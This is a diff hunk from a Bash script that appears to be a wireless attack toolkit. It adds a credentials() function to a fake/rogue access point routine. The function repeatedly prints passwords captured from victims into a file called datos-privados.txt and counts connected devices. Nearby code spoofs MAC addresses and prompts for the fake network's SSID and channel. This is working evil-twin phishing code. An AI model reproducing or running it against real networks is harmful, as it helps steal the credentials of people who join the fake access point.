@@ -620,6 +620,21 @@ bannerattack() {
 	echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 }
 fakeap() {
+
+	credentials() {
+		hosts=0 
+		tput civis
+		while true; do
+			echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
+			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
+			find \-name datos-privados.txt | xargs cat 2>/dev/null
+			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
+			sleep 3; clear
+		done
+	}
+	
 	clear; tput civis; echo -e "$blueColour[*]$grayColour Starting Fake/Rogue AP"; sleep 2
 	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
 	echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
